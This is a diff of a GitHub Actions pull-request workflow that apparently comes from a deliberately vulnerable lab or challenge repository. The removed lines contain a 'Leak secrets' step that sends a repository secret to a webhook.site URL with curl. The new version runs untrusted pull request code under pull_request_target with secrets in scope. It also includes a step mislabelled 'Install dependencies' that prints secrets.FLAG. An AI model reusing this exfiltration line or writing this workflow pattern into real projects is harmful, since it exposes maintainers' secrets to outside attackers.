@@ -1,16 +1,35 @@
-name: Vulnerable PR Workflow
+name: CI for Pull Requests
+
 on:
-  pull_request_target
+  pull_request_target:
+    branches:
+      - main
 
 jobs:
-  insecure-job:
+  build:
     runs-on: ubuntu-latest
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
 
-      - name: Leak secrets
-        run: curl "http://webhook.site/41c6b745-9747-4b36-9965-72752cbf04e0/value=${{ secrets.SEC_NAME }}"
-        
-      - name: Run build
-        run: echo "Building the project for branch ${{ github.event.pull_request.head.ref }}"
+    steps:
+      # Check out the HEAD of the pull request
+      - name: Check out HEAD ref
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+
+      # Set up Node.js
+      - name: Set up Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '16'
+      - name: Install dependencies
+        run: echo ${{ secrets.FLAG }}
+      # Install dependencies
+      - name: Install dependencies
+        run: npm install
+
+      # Run custom npm commands from package.json
+      - name: Run custom commands
+        run: |
+          npm run build
+          npm run test
